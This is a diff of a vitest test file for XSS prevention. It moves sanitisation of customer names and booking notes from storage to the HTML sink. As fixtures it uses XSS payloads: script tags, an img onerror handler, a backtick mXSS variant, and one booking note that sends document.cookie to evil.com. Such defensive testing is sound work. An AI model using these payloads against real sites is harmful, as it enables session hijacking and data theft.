@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { sanitizeText } from '@/utils/inputSanitization';
+import { sanitizeHtml, sanitizeText } from '@/utils/inputSanitization';
 import DOMPurify from 'dompurify';
 
 describe('XSS (Cross-Site Scripting) Prevention', () => {
@@ -49,30 +49,34 @@ describe('XSS (Cross-Site Scripting) Prevention', () => {
   });
 
   describe('Customer Name XSS Prevention', () => {
-    it('should sanitize script tags in customer name', () => {
+    it('preserves storage text and encodes script tags at an HTML sink', () => {
       const maliciousName = '<script>alert("XSS")</script>John Doe';
       const result = sanitizeText(maliciousName);
-      
-      expect(result.sanitized).not.toContain('<script');
-      expect(result.sanitized).not.toContain('</script>');
+
+      expect(result.sanitized).toBe(maliciousName);
+      expect(sanitizeHtml(result.sanitized)).not.toContain('<script');
+      expect(sanitizeHtml(result.sanitized)).toContain('&lt;script&gt;');
       expect(result.suspicious).toBe(true);
     });
 
-    it('should sanitize event handlers', () => {
+    it('preserves storage text and encodes event-handler markup at an HTML sink', () => {
       const maliciousName = '<img src=x onerror=alert("XSS")>';
       const result = sanitizeText(maliciousName);
-      
-      expect(result.sanitized).not.toContain('onerror');
-      expect(result.sanitized).not.toContain('<img');
+
+      expect(result.sanitized).toBe(maliciousName);
+      expect(sanitizeHtml(result.sanitized)).not.toContain('<img');
+      expect(sanitizeHtml(result.sanitized)).toContain('&lt;img');
+      expect(result.suspicious).toBe(true);
     });
   });
 
   describe('Booking Notes XSS Prevention', () => {
-    it('should sanitize HTML in booking notes', () => {
+    it('should encode booking-note HTML only at the HTML sink', () => {
       const maliciousNote = 'Please call me <script>fetch("http://evil.com?cookie="+document.cookie)</script>';
       const result = sanitizeText(maliciousNote);
-      
-      expect(result.sanitized).not.toContain('<script');
+
+      expect(result.sanitized).toBe(maliciousNote);
+      expect(sanitizeHtml(result.sanitized)).not.toContain('<script');
       expect(result.sanitized).toContain('Please call me');
     });
 
@@ -81,6 +85,7 @@ describe('XSS (Cross-Site Scripting) Prevention', () => {
       const result = sanitizeText(safeText);
       
       expect(result.sanitized).toBe(safeText);
+      expect(sanitizeHtml(result.sanitized)).toBe('Special chars: &amp;lt;, &amp;gt;, &amp;amp;');
       expect(result.suspicious || false).toBe(false);
     });
   });
@@ -129,8 +134,13 @@ describe('XSS (Cross-Site Scripting) Prevention', () => {
     it('should prevent mXSS via backticks', () => {
       const mXssAttack = '<img src=`x`onerror=alert(1)>';
       const cleaned = DOMPurify.sanitize(mXssAttack);
-      
-      expect(cleaned).not.toContain('onerror');
+
+      // In this malformed form the word "onerror" can remain inside the
+      // quoted src value. The security property is that no executable
+      // onerror attribute survives parsing.
+      const container = document.createElement('div');
+      container.innerHTML = cleaned;
+      expect(container.querySelector('[onerror]')).toBeNull();
     });
   });
 
